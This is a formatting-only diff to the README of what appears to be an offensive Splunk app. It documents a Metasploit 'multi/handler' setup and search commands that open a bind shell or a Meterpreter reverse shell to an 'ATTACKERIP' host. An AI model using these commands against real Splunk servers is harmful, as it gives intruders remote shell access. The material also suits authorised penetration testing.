@@ -34,7 +34,7 @@ Using each of these shells can be done from the Search and Reporting app. Setup 
 
 ## Setup Metasploit Handler
 
-use multi/handler<br>
+`use multi/handler`
 
 Pick one of the below
 
@@ -49,7 +49,7 @@ exploit -j<br>
 
 ## Bind Shell
 
-'| bindshell SHELLTYPE PORTNUMBER' 
+`| bindshell SHELLTYPE PORTNUMBER` 
 
 SHELLTYPE - Specify std or msf (std = Standard Shell|msf = Meterpreter Shell)
 
@@ -58,7 +58,7 @@ PORTNUMBER - Specify the port you want the bind shell to listen on. If you do no
 
 ## Reverse Shell
 
-'| revshell SHELLTYPE ATTACKERIP ATTACKERPORT'
+`| revshell SHELLTYPE ATTACKERIP ATTACKERPORT`
 
 SHELLTYPE - Specify std or msf (std = Standard Shell|msf = Meterpreter Shell)
 
